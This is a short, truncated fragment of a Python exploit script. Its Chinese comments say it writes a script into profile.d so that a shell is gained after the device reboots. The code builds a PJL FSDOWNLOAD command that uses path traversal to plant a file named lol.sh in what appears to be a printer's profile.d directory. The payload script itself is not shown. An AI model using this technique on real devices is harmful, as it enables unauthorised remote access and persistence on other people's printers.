# -*- coding:utf-8 -*-
##
# 向profile.d写入一个脚本，重启设备后，即可获取到一个shell。
# 由于easysnmp的缘由，请在linux内使用该脚本
...
dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(
	len(profile_d_script)) + ' NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
